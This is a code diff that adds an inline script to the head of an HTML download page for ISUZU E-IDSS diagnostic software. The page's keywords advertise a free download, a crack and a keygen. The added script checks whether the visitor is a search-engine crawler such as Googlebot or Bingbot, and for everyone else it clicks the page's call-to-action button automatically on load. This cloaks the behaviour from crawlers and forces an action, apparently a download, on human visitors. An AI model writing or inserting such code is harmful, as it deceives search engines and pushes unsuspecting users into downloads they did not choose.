@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ISUZU E-IDSS Engine Industrial 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="ISUZU E-IDSS Engine Industrial 07.2024 diagnostic software offers advanced functions, repair guides, wiring diagrams, and supports multiple languages.">
     <meta name="keywords" content="Isuzu E-IDSS Engine Industrial 2024, Isuzu E-IDSS 07.2024, Isuzu E-IDSS Engine Industrial free download, Isuzu E-IDSS download, Isuzu E-IDSS diagnostic software, Isuzu E-IDSS 2024 free download, Isuzu E-IDSS diagnostic software download, Isuzu E-IDSS diagnostic software crack, Isuzu E-IDSS diagnostic software keygen, Isuzu E-IDSS advanced diagnostics, Isuzu engine diagnostic software, Isuzu E-IDSS engine diagnostic service system, Isuzu engine troubleshooting software, Isuzu E-IDSS repair guides, Isuzu wiring diagrams, Isuzu engine support software, Isuzu industrial engines diagnostic, Isuzu engine repair documents, Isuzu diagnostic service tool, Isuzu engine recommendations, Isuzu E-IDSS Windows 7, Isuzu E-IDSS Windows 10, Isuzu E-IDSS English, Isuzu E-IDSS China, Isuzu E-IDSS Japan, Isuzu Engine Diagnostic Service System, E-IDSS intuitive interface, Isuzu diagnostic software, E-IDSS download free, Isuzu diagnostic software download free, Isuzu промышленный диагностический софт, Isuzu E-IDSS скачать бесплатно, Isuzu диагностика двигателя, Isuzu E-IDSS диагностическое ПО, Isuzu ремонтные документы, Isuzu E-IDSS промышленный двигатель">
     <style>
